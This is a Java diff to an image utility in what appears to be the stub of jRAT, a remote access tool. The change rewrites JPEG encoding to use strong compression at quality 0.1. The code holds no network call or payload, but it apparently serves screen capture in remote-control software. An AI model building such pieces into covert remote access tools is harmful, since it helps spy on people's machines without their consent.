@@ -1,33 +1,31 @@
 package pro.jrat.stub.utils;
+
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.Iterator;
 
+import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
+import javax.imageio.ImageWriteParam;
+import javax.imageio.ImageWriter;
+import javax.imageio.stream.ImageOutputStream;
 
 public class ImageUtils {
 
 	public static byte[] encodeImage(BufferedImage image) throws IOException {
-		/*ImageWriter writer = ImageIO.getImageWritersByFormatName("jpeg").next();
-		ImageWriteParam writeParam = writer.getDefaultWriteParam();
+		ByteArrayOutputStream bss = new ByteArrayOutputStream();
+		ImageOutputStream baos = ImageIO.createImageOutputStream(bss);
+		Iterator<ImageWriter> iter = ImageIO.getImageWritersByFormatName("jpeg");
+		ImageWriter writer = iter.next();
+		ImageWriteParam iwp = writer.getDefaultWriteParam();
+		iwp.setCompressionMode(2);
+		iwp.setCompressionQuality(0.1f);
+		writer.setOutput(baos);
+		writer.write(null, new IIOImage(image, null, null), iwp);
+		writer.dispose();
 
-		writeParam.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
-		writeParam.setCompressionQuality(quality);
-
-		ByteArrayOutputStream output = new ByteArrayOutputStream();
-		MemoryCacheImageOutputStream mcios = new MemoryCacheImageOutputStream(output);
-		writer.setOutput(mcios);
-		writer.write(null, new IIOImage(image, null, null), writeParam);
-		mcios.close();
-		return output.toByteArray();*/
-		
-		ByteArrayOutputStream baos = new ByteArrayOutputStream();
-		ImageIO.write(image, "jpg", baos);
-		baos.flush();
-		byte[] bytes = baos.toByteArray();
-		baos.close();
-		
-		return bytes;
+		return bss.toByteArray();
 	}
 
 }
